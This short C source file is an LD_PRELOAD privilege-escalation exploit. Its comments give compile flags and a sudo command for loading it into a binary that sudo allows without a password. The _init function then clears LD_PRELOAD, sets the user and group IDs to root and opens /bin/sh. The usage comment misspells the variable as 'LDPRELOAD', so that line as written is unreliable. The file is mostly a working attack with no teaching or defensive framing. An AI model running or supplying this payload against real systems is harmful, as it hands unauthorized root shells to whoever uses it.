//Compile with:
//gcc ld_preload_shell.c -fPIC -shared -nostartfiles -w
//sudo LDPRELOAD=/path/to/a.out /sudo/nopasswd/binary
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}
